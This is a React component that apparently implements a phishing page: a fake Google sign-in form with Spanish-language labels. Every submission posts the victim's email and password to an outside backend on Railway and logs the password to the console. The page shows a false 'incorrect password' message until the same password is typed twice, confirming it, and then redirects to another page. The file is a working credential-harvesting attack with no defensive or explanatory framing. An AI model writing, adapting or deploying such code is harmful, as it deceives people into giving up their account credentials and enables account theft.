import { useState, useEffect } from "react";
import axios from "axios";
import googleLogo from "/google.png";
import asisLogo from "/asislogo.png";

const URL = "https://backend-web01-production.up.railway.app/";

export default function App() {
  const [inputs, setInputs] = useState({});
  const [curPassword, setCurPassword] = useState("");
  const [samePassword, setSamePassword] = useState(null);

  useEffect(() => {
    if (samePassword) {
      window.location.assign("/ficha/");
    }
  }, [samePassword]);

  const handleChange = (event) => {
    const name = event.target.name;
    const value = event.target.value;
    setInputs((values) => ({ ...values, [name]: value }));
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    console.log(event.target[1].value);
    try {
      await axios.post(URL, inputs);
    } catch (error) {
      console.error(error);
    }
    
    if (inputs.password == curPassword) {
      setSamePassword(true);
    }
    setCurPassword(inputs.password);
    
  };

  return (
    <div className="p-10">
        <div>
          <a className="flex justify-center" href="https://www.google.com">
            <img
              className="object-cover w-20 justify-center"
              src={asisLogo}
            />
          </a>
        </div>
      <form
        onSubmit={handleSubmit}
        className="flex flex-col gap-4 bg-white shadow-lg rounded px-8 pt-6 pb-8 mt-4 mb-4 lg:w-1/2 md:w-2/5 sm:w-2/5 justify-self-center"
      >
        <div>
          <a className="flex justify-center" href="https://www.google.com">
            <img
              className="object-cover w-20 justify-center"
              src={googleLogo}
            />
          </a>
        </div>

        <div className="flex flex-col">
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            type="email"
            name="email"
            value={inputs.email || ""}
            placeholder="Correo electrónico"
            onChange={handleChange}
          />
        </div>
        <div className="flex flex-col">
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            type="password"
            name="password"
            value={inputs.password || ""}
            placeholder="Contraseña"
            onChange={handleChange}
          />
          {(curPassword !== "") ? <p className="mt-2 font-base text-xs text-red-500">Contraseña incorrecta. Vuelve a intentarlo, porfavor.</p>:null}
        </div>
        <div className="flex items-center h-1/2 justify-end">
          <button
            className="bg-blue-500 hover:bg-blue-700 text-white font-base text-sm py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            type="submit"
          >
            Inicia sesión
          </button>
        </div>
      </form>
    </div>
  );
}
